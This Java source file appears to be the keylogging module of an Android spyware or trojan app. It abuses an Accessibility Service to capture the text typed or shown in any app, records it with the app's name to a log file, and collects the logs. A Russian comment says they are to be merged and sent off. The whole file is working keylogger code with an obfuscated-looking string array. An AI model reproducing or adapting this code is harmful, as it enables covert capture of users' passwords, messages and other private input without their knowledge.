// Используется Accessibility Service, а не TcpClient'ом

package com.test.Modules;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;

import com.test.myapp.FileLogReadWrite;
import com.test.myapp.MyAccessibilityService;
import com.test.myapp.OptionAccessibilityClass;

import java.util.ArrayList;

public class KLogModule {

    public static String c_ClassGen11_mn[]={"","","","","","","","","","","","","","","","",""};

    public static void loggingKInputEvent(Context context, AccessibilityEvent event, int myTypeEvent) {

            if (event == null)
            {
                return;
            }

            String txtEvent = event.getText().toString();
            String msg = txtEvent.replace("[","").replace("]","");
            if (msg.length() <1 || msg.isEmpty())
            {
                if(event.getContentDescription() != null) {
                    msg = event.getContentDescription().toString();

                    if (msg.length() <1 || msg.isEmpty())
                    {
                        return;
                    }
                }
            }
            txtEvent = msg;
            String pkgName = (String) event.getPackageName();
            PackageManager pkgMngr = context.getApplicationContext().getPackageManager();
            ApplicationInfo appInfo ;
            try {
                appInfo = pkgMngr.getApplicationInfo(pkgName, 0);

            } catch (final PackageManager.NameNotFoundException e) {
                appInfo = null;
            }
            String n = (String) (appInfo != null ? pkgMngr.getApplicationLabel(appInfo ) : c_ClassGen11_mn[3]);
            FileLogReadWrite.writeFile(  n + "#" + txtEvent + "#"); // + String.valueOf(myTypeEvent));
    }


    public static ArrayList<String> getContentKLogFile() {
        // нужно обьединить все файлы лог и отправить их как один, все
        return FileLogReadWrite.getContentFilesLog(String.valueOf(3));
    }
}
